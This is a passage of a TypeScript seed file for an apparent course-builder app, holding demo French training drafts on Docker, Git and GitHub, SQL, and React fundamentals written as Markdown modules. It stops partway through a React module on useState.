/**
 * seedDrafts.ts — Données de démonstration pour les tests visuels.
 *
 * Appeler `seedDemoData()` pour injecter 5 ébauches réalistes dans
 * localStorage. Ne remplace PAS les données existantes si le storage
 * n'est pas vide.
 */
import type { Draft } from "./builderStorage";

const NOW = new Date().toISOString();
const D = (daysAgo: number) =>
  new Date(Date.now() - daysAgo * 86_400_000).toISOString();

// ─── Ébauche 1 — Introduction à Docker ───────────────────────────────────────
const DOCKER: Draft = {
  id: "introduction_a_docker",
  createdAt: D(12),
  updatedAt: D(1),
  metadata: {
    displayName: "Introduction à Docker",
    description:
      "Comprendre les conteneurs, maîtriser les commandes de base et déployer ses premières applications avec Docker et Docker Compose.",
    type: "Formation",
    level: "Débutant",
    estimatedDuration: "3h",
    tags: ["docker", "devops", "conteneurs", "linux"],
  },
  modules: [
    {
      index: 1,
      filename: "01_Module.md",
      markdown: `# Pourquoi Docker ?

## Le problème du "ça marche chez moi"

Chaque développeur l'a vécu : une application fonctionne parfaitement en local, puis plante en production à cause de différences d'environnement (version de Python, librairies système, variables d'environnement…).

> "It works on my machine" — citation universelle du développeur

Docker résout ce problème en **empaquetant l'application et tout son environnement** dans une unité portable appelée **conteneur**.

## Virtualisation vs Conteneurs

| Caractéristique | Machine Virtuelle | Conteneur Docker |
|---|---|---|
| Démarrage | 30–60 secondes | < 1 seconde |
| Taille | Plusieurs Go | Quelques Mo à centaines de Mo |
| Isolation | Complète (OS dédié) | Partielle (noyau partagé) |
| Portabilité | Moyenne | Excellente |
| Performance | Overhead important | Quasi-natif |

## Concepts fondamentaux

- **Image** : modèle immuable (comme une classe en POO)
- **Conteneur** : instance d'une image en cours d'exécution
- **Dockerfile** : recette de construction d'une image
- **Registry** : dépôt d'images (Docker Hub, GHCR, ECR…)
- **Docker Compose** : orchestration de plusieurs conteneurs

## Architecture Docker

\`\`\`
Client Docker  →  Docker Daemon  →  Conteneurs
                        ↕
                   Docker Hub / Registry
\`\`\`

## Objectifs du module suivant

- Installer Docker sur sa machine
- Comprendre le cycle de vie d'un conteneur
`,
      updatedAt: D(3),
    },
    {
      index: 2,
      filename: "02_Module.md",
      markdown: `# Installation et premières commandes

## Installation

### Linux (Ubuntu/Debian)

\`\`\`bash
# Mise à jour des paquets
sudo apt update

# Installation des dépendances
sudo apt install -y ca-certificates curl gnupg

# Ajout de la clé GPG officielle
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker.gpg

# Installation de Docker Engine
sudo apt install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin
\`\`\`

### Vérification

\`\`\`bash
docker --version
# Docker version 24.0.5, build ced0996

docker run hello-world
\`\`\`

## Cycle de vie d'un conteneur

\`\`\`
docker pull  →  docker run  →  docker stop  →  docker rm
                    ↓
               docker exec (accès au conteneur actif)
\`\`\`

## Commandes essentielles

\`\`\`bash
# Lister les images téléchargées
docker images

# Lancer un conteneur interactif Ubuntu
docker run -it ubuntu bash

# Lister les conteneurs actifs
docker ps

# Lister tous les conteneurs (actifs + arrêtés)
docker ps -a

# Arrêter un conteneur
docker stop <id_ou_nom>

# Supprimer un conteneur
docker rm <id_ou_nom>

# Supprimer une image
docker rmi nginx
\`\`\`

## Exercice

durée: 20min

1. Lancez un conteneur **nginx** en mode détaché sur le port 8080 :
   \`docker run -d -p 8080:80 --name mon-nginx nginx\`
2. Ouvrez \`http://localhost:8080\` dans votre navigateur
3. Affichez les logs : \`docker logs mon-nginx\`
4. Arrêtez et supprimez le conteneur

## Récapitulatif

- \`docker run\` = pull + create + start
- Les conteneurs sont éphémères par défaut
- \`-d\` = mode détaché (background)
- \`-p host:container\` = mapping de port
`,
      updatedAt: D(2),
    },
    {
      index: 3,
      filename: "03_Module.md",
      markdown: `# Créer ses propres images avec Dockerfile

## Structure d'un Dockerfile

\`\`\`dockerfile
# Image de base
FROM node:20-alpine

# Répertoire de travail dans le conteneur
WORKDIR /app

# Copier les fichiers de dépendances
COPY package*.json ./

# Installer les dépendances
RUN npm ci --only=production

# Copier le code source
COPY . .

# Exposer le port de l'application
EXPOSE 3000

# Commande de démarrage
CMD ["node", "server.js"]
\`\`\`

## Instructions Dockerfile essentielles

| Instruction | Rôle |
|---|---|
| \`FROM\` | Image de base |
| \`WORKDIR\` | Répertoire de travail |
| \`COPY\` | Copier des fichiers depuis l'hôte |
| \`ADD\` | Comme COPY, mais supporte les URLs et archives |
| \`RUN\` | Exécuter une commande lors du build |
| \`ENV\` | Définir une variable d'environnement |
| \`EXPOSE\` | Documenter un port (ne l'ouvre pas) |
| \`CMD\` | Commande par défaut au démarrage |
| \`ENTRYPOINT\` | Point d'entrée fixe du conteneur |

## Build et publication

\`\`\`bash
# Construire l'image
docker build -t mon-app:1.0 .

# Tagger pour Docker Hub
docker tag mon-app:1.0 monusername/mon-app:1.0

# Pousser sur Docker Hub
docker push monusername/mon-app:1.0
\`\`\`

## Bonnes pratiques

- Utiliser des images **Alpine** ou **Slim** pour réduire la taille
- Combiner les commandes \`RUN\` avec \`&&\` pour limiter les couches
- Placer les instructions qui changent peu (**RUN npm install**) avant celles qui changent souvent (**COPY . .**)
- Utiliser \`.dockerignore\` pour exclure \`node_modules\`, \`.git\`, etc.

## Exercice

durée: 30min

Créez une image Docker pour une application Node.js Express simple qui répond "Hello Docker !" sur \`/\`.
`,
      updatedAt: D(2),
    },
    {
      index: 4,
      filename: "04_Module.md",
      markdown: `# Docker Compose — orchestrer plusieurs services

## Pourquoi Docker Compose ?

Une application réelle comporte souvent plusieurs services :
- Un serveur web (Node.js, Django, Laravel…)
- Une base de données (PostgreSQL, MySQL, MongoDB…)
- Un cache (Redis)
- Un reverse proxy (Nginx)

Docker Compose permet de **définir et démarrer tous ces services en une seule commande**.

## Structure d'un docker-compose.yml

\`\`\`yaml
version: '3.8'

services:
  api:
    build: ./api
    ports:
      - "3000:3000"
    environment:
      - DATABASE_URL=postgres://user:pass@db:5432/mydb
    depends_on:
      - db
    restart: unless-stopped

  db:
    image: postgres:16-alpine
    volumes:
      - postgres_data:/var/lib/postgresql/data
    environment:
      POSTGRES_USER: user
      POSTGRES_PASSWORD: pass
      POSTGRES_DB: mydb

  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"

volumes:
  postgres_data:
\`\`\`

## Commandes Compose

\`\`\`bash
# Démarrer tous les services (en background)
docker compose up -d

# Voir les logs de tous les services
docker compose logs -f

# Arrêter et supprimer les conteneurs
docker compose down

# Rebuild les images avant de démarrer
docker compose up -d --build

# Exécuter une commande dans un service
docker compose exec api sh
\`\`\`

## Exercice

durée: 40min

Mettez en place une stack complète :
1. API Node.js Express connectée à PostgreSQL
2. Interface pgAdmin pour visualiser la BDD
3. Vérifiez que \`depends_on\` garantit l'ordre de démarrage

## Récapitulatif

- Un fichier \`docker-compose.yml\` par projet
- \`volumes\` pour la persistance des données
- \`depends_on\` pour l'ordre de démarrage
- \`restart: unless-stopped\` en production
`,
      updatedAt: D(1),
    },
    {
      index: 5,
      filename: "05_Module.md",
      markdown: `# Déploiement et bonnes pratiques en production

## Variables d'environnement et secrets

Ne jamais écrire les secrets directement dans le Dockerfile ou docker-compose.yml.

\`\`\`bash
# Fichier .env (jamais commité)
POSTGRES_PASSWORD=super_secret_password
JWT_SECRET=my_jwt_secret
API_KEY=sk-prod-xxxxx
\`\`\`

\`\`\`yaml
# docker-compose.yml
services:
  api:
    env_file:
      - .env
\`\`\`

## Healthchecks

\`\`\`yaml
services:
  api:
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:3000/health"]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 40s
\`\`\`

## Multi-stage builds — réduire la taille des images

\`\`\`dockerfile
# Stage 1 : build
FROM node:20 AS builder
WORKDIR /app
COPY . .
RUN npm ci && npm run build

# Stage 2 : production (image légère)
FROM node:20-alpine
WORKDIR /app
COPY --from=builder /app/dist ./dist
COPY --from=builder /app/node_modules ./node_modules
CMD ["node", "dist/server.js"]
\`\`\`

> Résultat : image passant de ~800 Mo à ~120 Mo

## Checklist production

- [ ] Image basée sur une version fixe (pas \`latest\`)
- [ ] Utilisateur non-root dans le conteneur
- [ ] Healthcheck configuré
- [ ] Variables sensibles dans \`.env\` ou secrets manager
- [ ] Volumes pour les données persistantes
- [ ] Politique de restart définie
- [ ] Logs centralisés

## Questions

Des questions sur Docker en production ?

## Récapitulatif de la formation

- Docker résout le problème de portabilité des environnements
- Dockerfile = recette de construction d'image
- Docker Compose = orchestration multi-conteneurs locale
- Les bonnes pratiques production : multi-stage, healthchecks, secrets
`,
      updatedAt: D(1),
    },
  ],
};

// ─── Ébauche 2 — Git & GitHub pour débutants ─────────────────────────────────
const GIT: Draft = {
  id: "git_et_github_pour_debutants",
  createdAt: D(20),
  updatedAt: D(4),
  metadata: {
    displayName: "Git & GitHub pour débutants",
    description:
      "Maîtriser le versioning avec Git, collaborer sur GitHub et comprendre les workflows professionnels (branches, pull requests, CI/CD).",
    type: "Formation",
    level: "Débutant",
    estimatedDuration: "2h",
    tags: ["git", "github", "versionning", "collaboration"],
  },
  modules: [
    {
      index: 1,
      filename: "01_Module.md",
      markdown: `# Comprendre le versioning

## Qu'est-ce qu'un système de contrôle de version ?

Un **VCS (Version Control System)** enregistre toutes les modifications apportées à un projet au fil du temps, permettant de :

- Revenir à une version précédente en cas de bug
- Travailler en parallèle sur plusieurs fonctionnalités
- Collaborer à plusieurs sans écraser le travail des autres
- Comprendre **qui** a modifié **quoi** et **pourquoi**

## Git vs SVN vs Mercurial

| Critère | Git | SVN | Mercurial |
|---|---|---|---|
| Architecture | Distribué | Centralisé | Distribué |
| Popularité | Très haute | En déclin | Faible |
| Courbe d'apprentissage | Moyenne | Faible | Faible |
| Performance | Excellente | Moyenne | Bonne |
| Hébergement | GitHub, GitLab, Bitbucket | Apache SVN | Bitbucket |

> Git est utilisé par **94 %** des développeurs professionnels (Stack Overflow 2023).

## Les trois zones de Git

\`\`\`
Working Directory  →  Staging Area  →  Repository (.git)
   (fichiers          (git add)        (git commit)
   modifiés)
\`\`\`

## Installation

\`\`\`bash
# Ubuntu / Debian
sudo apt install git

# macOS
brew install git

# Vérification
git --version
# git version 2.42.0

# Configuration initiale (obligatoire)
git config --global user.name "Prénom Nom"
git config --global user.email "vous@exemple.com"
\`\`\`
`,
      updatedAt: D(5),
    },
    {
      index: 2,
      filename: "02_Module.md",
      markdown: `# Commandes fondamentales

## Initialiser et commiter

\`\`\`bash
# Créer un nouveau dépôt
git init mon-projet
cd mon-projet

# Voir l'état du dépôt
git status

# Ajouter des fichiers au staging
git add index.html        # un fichier spécifique
git add src/              # un dossier entier
git add .                 # tout le répertoire courant

# Créer un commit
git commit -m "feat: ajout de la page d'accueil"

# Voir l'historique
git log --oneline --graph
\`\`\`

## Naviguer dans l'historique

\`\`\`bash
# Voir les différences (fichiers modifiés non stagés)
git diff

# Voir les différences (fichiers stagés)
git diff --staged

# Annuler les modifications d'un fichier
git restore mon-fichier.js

# Revenir à un commit précédent (sans modifier l'historique)
git checkout abc1234
\`\`\`

## Le fichier .gitignore

\`\`\`gitignore
# Dépendances
node_modules/
vendor/

# Build
dist/
build/
*.min.js

# Environnement
.env
.env.local
*.env

# IDE
.vscode/
.idea/
*.swp

# OS
.DS_Store
Thumbs.db
\`\`\`

## Exercice

durée: 25min

1. Initialisez un dépôt Git dans un nouveau dossier
2. Créez 3 fichiers et faites 3 commits distincts
3. Utilisez \`git log --oneline\` pour visualiser l'historique
4. Modifiez un fichier et utilisez \`git diff\` pour voir les changements

## Récapitulatif

- \`git init\` → créer un dépôt
- \`git add\` → préparer les modifications
- \`git commit\` → enregistrer un snapshot
- \`git log\` → visualiser l'historique
- \`.gitignore\` → exclure des fichiers du tracking
`,
      updatedAt: D(4),
    },
    {
      index: 3,
      filename: "03_Module.md",
      markdown: `# Branches et fusion

## Concept des branches

Une branche est un **pointeur mobile** vers un commit. La branche par défaut s'appelle \`main\` (ou \`master\` pour les anciens projets).

\`\`\`
main:    A --- B --- C
                      \\
feature:               D --- E
\`\`\`

## Travailler avec les branches

\`\`\`bash
# Créer et basculer sur une nouvelle branche
git checkout -b feature/login
# ou (syntaxe moderne)
git switch -c feature/login

# Lister les branches
git branch -a

# Basculer sur une branche existante
git switch main

# Fusionner une branche dans main
git switch main
git merge feature/login

# Supprimer une branche (après fusion)
git branch -d feature/login
\`\`\`

## Résoudre les conflits

Un conflit survient quand deux branches modifient la même ligne.

\`\`\`
<<<<<<< HEAD (votre branche)
const couleur = "bleu";
=======
const couleur = "rouge";
>>>>>>> feature/couleurs
\`\`\`

**Résolution :**
1. Ouvrir le fichier et choisir la version à garder
2. Supprimer les marqueurs de conflit
3. \`git add fichier-conflit.js\`
4. \`git commit\`

## Stratégies de merge

| Stratégie | Commande | Usage |
|---|---|---|
| Merge commit | \`git merge\` | Conserve l'historique complet |
| Fast-forward | \`git merge --ff-only\` | Branche linéaire uniquement |
| Rebase | \`git rebase main\` | Historique linéaire propre |
| Squash | \`git merge --squash\` | Condense en 1 commit |

## Exercice

durée: 30min

Simulez un workflow de feature branch :
1. Créez \`feature/contact-form\` depuis \`main\`
2. Faites 2 commits sur la feature
3. Revenez sur \`main\`, faites 1 commit
4. Fusionnez la feature et résolvez le conflit éventuel
`,
      updatedAt: D(4),
    },
    {
      index: 4,
      filename: "04_Module.md",
      markdown: `# GitHub et collaboration

## Connecter un dépôt local à GitHub

\`\`\`bash
# Ajouter un remote
git remote add origin https://github.com/user/repo.git

# Premier push (établit le tracking)
git push -u origin main

# Push suivants
git push

# Récupérer les modifications distantes
git fetch origin
git pull origin main
\`\`\`

## Workflow GitHub Flow

\`\`\`
1. Créer une branche depuis main
2. Faire des commits
3. Ouvrir une Pull Request
4. Revue de code par les pairs
5. Merge dans main
6. Déploiement automatique (CI/CD)
\`\`\`

## Pull Request — bonnes pratiques

**Un bon titre de PR :**
- \`feat: ajout de l'authentification OAuth\`
- \`fix: correction du calcul de TVA\`
- \`docs: mise à jour du README d'installation\`

**Description idéale :**
- Ce qui a été fait et pourquoi
- Captures d'écran si changement visuel
- Instructions de test
- Référence à l'issue : \`Closes #42\`

## Conventional Commits

| Préfixe | Usage |
|---|---|
| \`feat:\` | Nouvelle fonctionnalité |
| \`fix:\` | Correction de bug |
| \`docs:\` | Documentation uniquement |
| \`style:\` | Formatage, pas de logique |
| \`refactor:\` | Refactoring |
| \`test:\` | Ajout ou modification de tests |
| \`chore:\` | Maintenance, dépendances |

## Récapitulatif de la formation

- Git permet un versioning distribué et robuste
- Les branches isolent les développements en cours
- GitHub facilite la collaboration via les PRs
- Les conventions de commits améliorent la lisibilité de l'historique
`,
      updatedAt: D(4),
    },
  ],
};

// ─── Ébauche 3 — Les bases du SQL ────────────────────────────────────────────
const SQL: Draft = {
  id: "les_bases_du_sql",
  createdAt: D(30),
  updatedAt: D(7),
  metadata: {
    displayName: "Les bases du SQL",
    description:
      "Comprendre les bases de données relationnelles et maîtriser les requêtes SQL essentielles : SELECT, JOIN, agrégations et transactions.",
    type: "Formation",
    level: "Débutant",
    estimatedDuration: "4h",
    tags: ["sql", "base-de-données", "postgresql", "mysql"],
  },
  modules: [
    {
      index: 1,
      filename: "01_Module.md",
      markdown: `# Introduction aux bases de données relationnelles

## Qu'est-ce qu'une base de données relationnelle ?

Une **base de données relationnelle (SGBDR)** organise les données en **tables** (relations) composées de **lignes** (enregistrements) et de **colonnes** (attributs), reliées entre elles par des **clés**.

## Les SGBDR populaires

| SGBDR | Licence | Usage typique |
|---|---|---|
| PostgreSQL | Open Source | Applications web, data science |
| MySQL / MariaDB | Open Source | Sites web (WordPress, Drupal…) |
| SQLite | Open Source | Mobile, embarqué, prototypage |
| Oracle Database | Propriétaire | Entreprises, banques |
| Microsoft SQL Server | Propriétaire | Environnements Microsoft |

## Modèle relationnel — concepts clés

- **Table** : ensemble de données de même nature (ex : \`clients\`, \`commandes\`)
- **Colonne** : attribut d'une entité (ex : \`nom\`, \`email\`, \`montant\`)
- **Ligne / Tuple** : un enregistrement (ex : un client spécifique)
- **Clé primaire (PK)** : identifiant unique d'une ligne
- **Clé étrangère (FK)** : référence vers la PK d'une autre table
- **Index** : structure accélérant les recherches

## Exemple de schéma

\`\`\`
clients (id_client PK, nom, email, ville)
    ↑
commandes (id_commande PK, id_client FK, date, total)
    ↑
lignes_commande (id_ligne PK, id_commande FK, id_produit FK, quantite, prix_unitaire)
    
produits (id_produit PK, nom, prix, stock)
\`\`\`

## Installation PostgreSQL

\`\`\`bash
# Ubuntu
sudo apt install postgresql postgresql-contrib

# Connexion
sudo -u postgres psql

# Créer une base et un utilisateur
CREATE DATABASE formation;
CREATE USER formateur WITH PASSWORD 'motdepasse';
GRANT ALL PRIVILEGES ON DATABASE formation TO formateur;
\`\`\`
`,
      updatedAt: D(8),
    },
    {
      index: 2,
      filename: "02_Module.md",
      markdown: `# Créer et manipuler des tables

## DDL — Data Definition Language

\`\`\`sql
-- Créer une table
CREATE TABLE clients (
    id_client   SERIAL PRIMARY KEY,
    nom         VARCHAR(100) NOT NULL,
    email       VARCHAR(255) UNIQUE NOT NULL,
    ville       VARCHAR(100),
    created_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Créer une table avec clé étrangère
CREATE TABLE commandes (
    id_commande SERIAL PRIMARY KEY,
    id_client   INT NOT NULL REFERENCES clients(id_client),
    date_cmd    DATE NOT NULL DEFAULT CURRENT_DATE,
    statut      VARCHAR(20) DEFAULT 'en_attente',
    total       DECIMAL(10, 2)
);

-- Modifier une table
ALTER TABLE clients ADD COLUMN telephone VARCHAR(20);
ALTER TABLE clients DROP COLUMN telephone;
ALTER TABLE commandes ALTER COLUMN statut SET NOT NULL;

-- Supprimer une table
DROP TABLE IF EXISTS commandes;
\`\`\`

## DML — Data Manipulation Language

\`\`\`sql
-- Insérer des données
INSERT INTO clients (nom, email, ville)
VALUES ('Alice Dupont', 'alice@exemple.fr', 'Paris');

-- Insertion multiple
INSERT INTO clients (nom, email, ville) VALUES
    ('Bob Martin', 'bob@exemple.fr', 'Lyon'),
    ('Carole Blanc', 'carole@exemple.fr', 'Bordeaux'),
    ('David Noir', 'david@exemple.fr', 'Paris');

-- Mettre à jour
UPDATE clients
SET ville = 'Marseille'
WHERE nom = 'Alice Dupont';

-- Supprimer
DELETE FROM clients
WHERE id_client = 5;
\`\`\`

## Exercice

durée: 30min

Créez le schéma d'une librairie en ligne :
- Table \`auteurs\` (id, nom, nationalite)
- Table \`livres\` (id, titre, id_auteur, prix, stock)
- Insérez 3 auteurs et 5 livres
`,
      updatedAt: D(7),
    },
    {
      index: 3,
      filename: "03_Module.md",
      markdown: `# SELECT — interroger les données

## Syntaxe de base

\`\`\`sql
SELECT colonnes
FROM   table
WHERE  condition
ORDER  BY colonne [ASC|DESC]
LIMIT  n
OFFSET m;
\`\`\`

## Exemples progressifs

\`\`\`sql
-- Tout récupérer (à éviter en production)
SELECT * FROM clients;

-- Colonnes spécifiques
SELECT nom, email, ville FROM clients;

-- Filtrer
SELECT * FROM clients WHERE ville = 'Paris';

-- Opérateurs de comparaison
SELECT * FROM commandes
WHERE total > 100
  AND statut = 'validée';

-- Recherche textuelle
SELECT * FROM clients
WHERE nom LIKE 'A%';        -- commence par A
-- WHERE nom ILIKE '%dupont%';  -- insensible à la casse (PostgreSQL)

-- Valeurs dans une liste
SELECT * FROM clients
WHERE ville IN ('Paris', 'Lyon', 'Bordeaux');

-- Trier
SELECT * FROM commandes
ORDER BY date_cmd DESC, total DESC;

-- Limiter les résultats (pagination)
SELECT * FROM clients
ORDER BY id_client
LIMIT 10 OFFSET 20;  -- page 3 (20 éléments par page)
\`\`\`

## Fonctions scalaires utiles

\`\`\`sql
-- Chaînes de caractères
SELECT UPPER(nom), LOWER(email), LENGTH(nom) FROM clients;
SELECT CONCAT(prenom, ' ', nom) AS nom_complet FROM clients;
SELECT TRIM(nom) FROM clients;

-- Dates
SELECT CURRENT_DATE, CURRENT_TIMESTAMP;
SELECT EXTRACT(YEAR FROM date_cmd) AS annee FROM commandes;
SELECT date_cmd + INTERVAL '30 days' AS echeance FROM commandes;

-- Nombres
SELECT ROUND(total, 2), CEIL(total), FLOOR(total) FROM commandes;
\`\`\`
`,
      updatedAt: D(7),
    },
    {
      index: 4,
      filename: "04_Module.md",
      markdown: `# JOIN — relier les tables

## Types de jointures

\`\`\`
Table A    INNER JOIN    Table B  →  Intersection uniquement
Table A    LEFT JOIN     Table B  →  Tout A + correspondances B
Table A    RIGHT JOIN    Table B  →  Tout B + correspondances A
Table A    FULL JOIN     Table B  →  Tout A et tout B
\`\`\`

## Exemples

\`\`\`sql
-- INNER JOIN : commandes avec le nom du client
SELECT c.nom, c.email, cmd.date_cmd, cmd.total
FROM commandes cmd
INNER JOIN clients c ON cmd.id_client = c.id_client
ORDER BY cmd.date_cmd DESC;

-- LEFT JOIN : clients avec leurs commandes (même sans commande)
SELECT c.nom, COUNT(cmd.id_commande) AS nb_commandes
FROM clients c
LEFT JOIN commandes cmd ON c.id_client = cmd.id_client
GROUP BY c.id_client, c.nom
ORDER BY nb_commandes DESC;

-- Jointure multiple
SELECT
    c.nom         AS client,
    cmd.date_cmd,
    p.nom         AS produit,
    lc.quantite,
    lc.prix_unitaire
FROM clients c
JOIN commandes cmd ON c.id_client  = cmd.id_client
JOIN lignes_commande lc ON cmd.id_commande = lc.id_commande
JOIN produits p ON lc.id_produit = p.id_produit
WHERE c.ville = 'Paris';
\`\`\`

## Exercice

durée: 35min

À partir du schéma librairie :
1. Listez tous les livres avec le nom de leur auteur
2. Trouvez les auteurs n'ayant aucun livre enregistré (LEFT JOIN + WHERE NULL)
3. Calculez le chiffre d'affaires potentiel par auteur (prix × stock)
`,
      updatedAt: D(7),
    },
    {
      index: 5,
      filename: "05_Module.md",
      markdown: `# Agrégations et sous-requêtes

## Fonctions d'agrégation

\`\`\`sql
SELECT
    COUNT(*)                    AS total_commandes,
    COUNT(DISTINCT id_client)   AS clients_uniques,
    SUM(total)                  AS chiffre_affaires,
    AVG(total)                  AS panier_moyen,
    MIN(total)                  AS plus_petite_commande,
    MAX(total)                  AS plus_grande_commande
FROM commandes
WHERE statut = 'validée';
\`\`\`

## GROUP BY et HAVING

\`\`\`sql
-- Chiffre d'affaires par ville
SELECT
    c.ville,
    COUNT(cmd.id_commande) AS nb_commandes,
    SUM(cmd.total)         AS ca_total,
    AVG(cmd.total)         AS panier_moyen
FROM clients c
JOIN commandes cmd ON c.id_client = cmd.id_client
GROUP BY c.ville
HAVING SUM(cmd.total) > 500      -- filtrer APRÈS l'agrégation
ORDER BY ca_total DESC;
\`\`\`

> **WHERE** filtre les lignes **avant** l'agrégation.
> **HAVING** filtre les groupes **après** l'agrégation.

## Sous-requêtes

\`\`\`sql
-- Clients ayant commandé plus que la moyenne
SELECT nom, email
FROM clients
WHERE id_client IN (
    SELECT id_client
    FROM commandes
    GROUP BY id_client
    HAVING SUM(total) > (SELECT AVG(total) FROM commandes)
);

-- Avec CTE (Common Table Expression) — plus lisible
WITH stats_clients AS (
    SELECT id_client, SUM(total) AS total_achats
    FROM commandes
    GROUP BY id_client
),
moyenne AS (
    SELECT AVG(total) AS moy FROM commandes
)
SELECT c.nom, sc.total_achats
FROM clients c
JOIN stats_clients sc ON c.id_client = sc.id_client
CROSS JOIN moyenne m
WHERE sc.total_achats > m.moy
ORDER BY sc.total_achats DESC;
\`\`\`
`,
      updatedAt: D(7),
    },
    {
      index: 6,
      filename: "06_Module.md",
      markdown: `# Transactions et index

## Les transactions ACID

| Propriété | Définition |
|---|---|
| **A**tomicité | Tout ou rien — pas de résultat partiel |
| **C**ohérence | La BDD passe d'un état valide à un autre |
| **I**solation | Les transactions concurrentes ne s'interfèrent pas |
| **D**urabilité | Les données commitées survivent aux pannes |

\`\`\`sql
-- Exemple : virement bancaire
BEGIN;

UPDATE comptes SET solde = solde - 500 WHERE id = 1;
UPDATE comptes SET solde = solde + 500 WHERE id = 2;

-- Vérification
SELECT solde FROM comptes WHERE id IN (1, 2);

-- Si tout est correct
COMMIT;

-- En cas d'erreur
-- ROLLBACK;
\`\`\`

## Index — accélérer les requêtes

\`\`\`sql
-- Créer un index simple
CREATE INDEX idx_clients_ville ON clients(ville);

-- Index unique (contraint les doublons)
CREATE UNIQUE INDEX idx_clients_email ON clients(email);

-- Index composite (multi-colonnes)
CREATE INDEX idx_commandes_client_date ON commandes(id_client, date_cmd);

-- Analyser l'utilisation d'un index
EXPLAIN ANALYZE
SELECT * FROM commandes WHERE id_client = 42;

-- Supprimer un index
DROP INDEX idx_clients_ville;
\`\`\`

## Quand créer un index ?

- Colonnes utilisées fréquemment dans \`WHERE\`, \`JOIN\`, \`ORDER BY\`
- Tables de grande taille (> 10 000 lignes)
- **Éviter** : colonnes à faible cardinalité (booléens, statuts)
- **Éviter** : sur-indexer (ralentit les INSERT/UPDATE/DELETE)

## Récapitulatif de la formation

- Le modèle relationnel organise les données en tables liées
- SELECT + JOIN = outil principal de requêtage
- GROUP BY + fonctions d'agrégation pour les statistiques
- Les transactions garantissent l'intégrité des données
- Les index accélèrent les requêtes sur les grandes tables

## Questions

Des questions sur le SQL ?
`,
      updatedAt: D(7),
    },
  ],
};

// ─── Ébauche 4 — React Fondamentaux ──────────────────────────────────────────
const REACT: Draft = {
  id: "react_fondamentaux",
  createdAt: D(45),
  updatedAt: D(2),
  metadata: {
    displayName: "React — Fondamentaux",
    description:
      "Construire des interfaces réactives avec React 19 : composants, hooks, gestion d'état et bonnes pratiques pour des applications maintenables.",
    type: "Formation",
    level: "Intermédiaire",
    estimatedDuration: "3h30",
    tags: ["react", "javascript", "frontend", "hooks"],
  },
  modules: [
    {
      index: 1,
      filename: "01_Module.md",
      markdown: `# Pourquoi React ?

## Le problème de la manipulation du DOM

Avant les frameworks modernes, mettre à jour l'interface nécessitait de manipuler le DOM manuellement :

\`\`\`javascript
// Vanilla JS — fastidieux et source de bugs
const ul = document.querySelector('#todo-list');
const li = document.createElement('li');
li.textContent = newTask;
li.addEventListener('click', () => li.remove());
ul.appendChild(li);
\`\`\`

Avec React, on **déclare** ce que l'UI doit afficher, React se charge de la mise à jour :

\`\`\`jsx
// React — déclaratif et lisible
function TodoList({ tasks }) {
  return (
    <ul>
      {tasks.map(task => (
        <li key={task.id}>{task.title}</li>
      ))}
    </ul>
  );
}
\`\`\`

## Les piliers de React

- **Déclaratif** : décrivez l'état souhaité, pas les étapes pour y arriver
- **Basé sur les composants** : interfaces = assemblage de briques réutilisables
- **Unidirectionnel** : le flux de données va toujours du parent vers l'enfant
- **Virtual DOM** : optimise les mises à jour réelles du DOM

## Comparatif des frameworks

| Framework | Créateur | Popularité | Courbe d'apprentissage |
|---|---|---|---|
| React | Meta | Très haute | Moyenne |
| Vue.js | Communauté | Haute | Faible |
| Angular | Google | Haute | Élevée |
| Svelte | Rich Harris | Croissante | Faible |
| Solid.js | Ryan Carniato | Émergente | Moyenne |

## Prérequis

- JavaScript ES6+ (let/const, arrow functions, destructuring, modules)
- Notions de HTML et CSS
- Node.js installé (v18+)

\`\`\`bash
# Créer un projet avec Vite (recommandé)
npm create vite@latest mon-app -- --template react
cd mon-app
npm install
npm run dev
\`\`\`
`,
      updatedAt: D(3),
    },
    {
      index: 2,
      filename: "02_Module.md",
      markdown: `# Composants et JSX

## Anatomie d'un composant React

\`\`\`jsx
// Composant fonctionnel (syntaxe moderne)
function MonBouton({ label, onClick, disabled = false }) {
  return (
    <button
      onClick={onClick}
      disabled={disabled}
      className="btn btn-primary"
    >
      {label}
    </button>
  );
}

// Utilisation
<MonBouton
  label="Envoyer"
  onClick={() => console.log('cliqué !')}
/>
\`\`\`

## JSX — syntaxe et règles

\`\`\`jsx
// ✅ Un seul élément racine (ou fragment)
return (
  <>
    <h1>Titre</h1>
    <p>Paragraphe</p>
  </>
);

// ✅ Expressions JavaScript entre {}
const name = "Alice";
return <h1>Bonjour, {name} !</h1>;

// ✅ Classe CSS : className (pas class)
return <div className="container">...</div>;

// ✅ Style inline : objet JavaScript
return <div style={{ color: 'red', fontSize: '16px' }}>...</div>;

// ✅ Conditionnel
return (
  <div>
    {isLoading ? <Spinner /> : <Content />}
    {error && <ErrorMessage message={error} />}
  </div>
);

// ✅ Listes : toujours une key unique
return (
  <ul>
    {items.map(item => (
      <li key={item.id}>{item.name}</li>
    ))}
  </ul>
);
\`\`\`

## Props — passage de données

\`\`\`jsx
// Destructuring des props
function UserCard({ name, avatar, role = 'Utilisateur' }) {
  return (
    <div className="card">
      <img src={avatar} alt={name} />
      <h2>{name}</h2>
      <span>{role}</span>
    </div>
  );
}

// PropTypes (vérification au runtime)
import PropTypes from 'prop-types';
UserCard.propTypes = {
  name: PropTypes.string.isRequired,
  avatar: PropTypes.string.isRequired,
  role: PropTypes.string,
};
\`\`\`
`,
      updatedAt: D(2),
    },
    {
      index: 3,
      filename: "03_Module.md",
      markdown: `# useState et useEffect

## useState — gérer l'état local

\`\`\`jsx
import { useState } from 'react';

function Compteur() {
  const [count, setCount] = useState(0);

  return (
    <div>
      <p>Compteur : {count}</p>
      <button onClick={() => setCount(c => c + 1)}>+1</button>
      <button onClick={() => setCount(0)}>Reset</button>
    </div>
  );
}
\`\`\`

> Toujours utiliser la **forme fonctionnelle** \`setCount(c => c + 1)\` quand la nouvelle valeur dépend de l'ancienne.

## État avec objets

\`\`\`jsx
function Formulaire() {
  const [form, setForm] = useState({
    nom: '',
    email: '',
    message: '',
  });

  const handleChange = (e) => {
    setForm(prev => ({
      ...prev,                         // conserver les autres champs
      [e.target.name]: e.target.value  // mettre à jour le champ modifié
    }));
  };

  return (
    <form>
      <input name="nom" value={form.nom} onChange={handleChange} />
